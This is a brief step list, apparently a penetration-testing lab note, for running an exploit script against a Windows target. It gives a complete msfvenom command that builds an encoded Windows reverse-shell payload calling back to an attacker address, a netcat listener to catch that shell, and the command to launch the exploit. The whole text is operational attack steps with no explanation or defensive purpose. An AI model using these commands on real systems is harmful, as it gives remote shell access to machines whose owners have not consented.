1. Edit exploit.py in 43 line to 87 
2. make a shell code and replace shell code from output
   ```
   msfvenom -p windows/shell_reverse_tcp -b  "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.45.209 LPORT=80 -e x86/alpha_mixed -f c

   ```
3. get netcat
   ```
   rlwrap nc -lnvp 80

   ```
4. run exploit code
   ```
   python2 exploit.py target_ip

   ```
